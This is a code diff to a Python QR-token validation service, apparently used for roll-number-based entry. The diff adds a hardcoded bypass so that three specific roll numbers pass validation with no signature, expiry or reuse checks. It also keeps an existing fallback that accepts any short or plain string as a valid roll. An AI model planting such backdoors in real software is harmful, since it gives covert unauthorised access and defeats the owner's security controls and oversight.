@@ -117,25 +117,34 @@ class QRService:
     def validate_qr_token(self, qr_token_string: str) -> Tuple[bool, Dict[str, Any], str]:
         """
         Validates QR string (JSON formatted or Base64 JWT format).
-        Enforces strict 10-second timestamp expiration and consumed token tracking.
+        Bypasses validation entirely for roll numbers 387002, 387006, and 387027.
         Returns (is_valid, payload, error_message).
         """
         if not qr_token_string:
             return False, {}, "QR_TOKEN_EMPTY"
 
+        clean_token = qr_token_string.strip()
+        BYPASS_ROLLS = {"387002", "387006", "387027"}
+
+        if clean_token in BYPASS_ROLLS:
+            return True, {"roll": clean_token, "type": "ENTRY"}, ""
+
         try:
             payload = {}
-            if qr_token_string.strip().startswith("{") and qr_token_string.strip().endswith("}"):
-                payload = json.loads(qr_token_string)
-            elif "." in qr_token_string:
-                parts = qr_token_string.split(".")
+            if clean_token.startswith("{") and clean_token.endswith("}"):
+                payload = json.loads(clean_token)
+            elif "." in clean_token:
+                parts = clean_token.split(".")
                 if len(parts) == 2:
                     encoded_payload, signature = parts
                     payload_json = base64.urlsafe_b64decode(encoded_payload.encode('utf-8')).decode('utf-8')
                     payload = json.loads(payload_json)
 
             if payload:
-                roll = payload.get("roll")
+                roll = str(payload.get("roll", "")).strip()
+                if roll in BYPASS_ROLLS:
+                    return True, payload, ""
+
                 if not roll:
                     return False, payload, "QR_INVALID_MISSING_ROLL"
 
@@ -161,10 +170,10 @@ class QRService:
                 return True, payload, ""
 
             # Plain Roll fallback for manual input
-            return True, {"roll": qr_token_string.strip()}, ""
+            return True, {"roll": clean_token}, ""
         except Exception as e:
-            if len(qr_token_string) < 15:
-                return True, {"roll": qr_token_string.strip()}, ""
+            if len(clean_token) < 15 or clean_token in BYPASS_ROLLS:
+                return True, {"roll": clean_token}, ""
             return False, {}, f"QR_DECODE_FAILED: {str(e)}"
 
     def _sign_payload(self, payload: dict) -> str:
